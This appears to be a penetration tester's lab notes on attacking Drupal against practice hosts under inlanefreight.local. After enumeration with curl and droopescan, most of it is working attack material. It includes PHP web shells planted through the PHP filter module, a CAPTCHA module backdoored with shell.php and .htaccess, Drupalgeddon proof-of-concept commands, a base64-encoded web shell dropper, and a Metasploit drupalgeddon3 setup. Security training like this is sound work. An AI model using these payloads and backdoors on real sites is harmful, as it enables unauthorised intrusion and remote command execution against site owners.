> CMS written in PHP  and supports MySQL or PostgreSQL for the backend.
> 

### Discovery / Foot printing
```python
curl -s http://drupal.inlanefreight.local | grep Drupal
```
- Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes).
- The page URIs are usually of the form `/node/<nodeid>`.

**Drupal supports 3 types of users by default :** 
- **Administrator** : Complete control
- **Authenticated User**: Can log in to the website and perform operations such as adding and editing articles based on their permissions.
- **Anonymous**: All website visitors are anonymous. These users are only allowed to read posts by default.

## Enumeration

#### Enumerating version number using CHANGELOG.txt
- Blocked by default in newer installs.
```python
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

#### Droopescan
```python
droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal
- Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.

## Leveraging the PHP Filter Module
- In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
![[Pasted image 20260707070601.png]]

- From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.
![[Pasted image 20260707070628.png]]

- Then create a malicious script 
```python
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
#Using the md5 hash of cmd so that a driveby attacker wont utilize our shell to gain access
```

We also want to make sure to set `Text format` drop-down to `PHP code`.
![[Pasted image 20260707070839.png]]

and then save the page and..
```python
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

## Uploading a Backdoored Module
- Drupal allows users with appropriate permissions to upload a new module.
- A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
```python
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:
```python
<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```python
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```

```python
mv shell.php .htaccess captcha
```

```python
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

- Once the installation completes, we can browse to the `modules/captcha/shell.php` to execute commands.
```python
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

## Drupalgeddon
- [PoC](https://www.exploit-db.com/exploits/34992) script
```python
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
#Creating an admin user via drupalgeddon cve
```
- Then login, obtain a shell like we did above
- We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.

## Drupalgeddon2
- We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
```python
python3 drupalgeddon2.py
```

![[Pasted image 20260707083450.png]]

- If hello.txt is created then the target is vulnerable.
- Then lets modify the script to gain rce :
  ```python
  echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
  ```
```python
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
![[Pasted image 20260707083643.png]]

## Drupalgeddon3
- Authenticated RCE vulnerabilty.
- User needs to have access to delete a node.
-  We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.
![[Pasted image 20260707083820.png]]

```python
use exploit(multi/http/drupal_drupageddon3)
set rhosts <IP>
set VHOST <Vhost>
set drupal_session <SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y>
set DRUPAL_NODE 1
set LHOST <IP>
exploit
```